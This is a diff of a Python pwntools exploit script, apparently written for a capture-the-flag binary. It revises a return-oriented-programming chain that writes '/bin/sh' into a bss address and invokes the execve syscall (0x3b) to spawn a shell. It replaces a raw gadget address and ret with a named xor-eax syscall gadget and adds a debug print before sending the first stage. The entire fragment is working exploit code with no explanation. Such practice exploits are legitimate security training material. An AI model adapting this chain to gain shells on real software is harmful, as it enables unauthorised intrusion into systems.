@@ -24,8 +24,8 @@ pop_rdx_pop_rsi = p64(0x000000000044bd59)
 pop_rsi = p64(0x0000000000410133)
 pop_rdx = p64(0x000000000044bd36)
 syscall = p64(0x000000000040128c)
+xor_eax_eax_syscall = p64(0x00000000004497ba)
 bss_addr = p64(0x6b6500) # address where we write /bin/sh
-ret = p64(0x0000000000400416)
 main = p64(0x00400bf8)
 
 call_main = [
@@ -41,8 +41,7 @@ read_execve_payload = [
 	p64(0x0),
 	pop_rsi,
 	bss_addr,
-	p64(0x4497ba),
-	ret,
+	xor_eax_eax_syscall,
 	pop_rax,
 	p64(0x3b),
 	pop_rdi,
@@ -63,6 +62,7 @@ for i in read_execve_payload:
 
 input('start')
 
+print('length first stage: ', len(first_stage))
 p.sendline(first_stage)
 
 sleep(0.1)
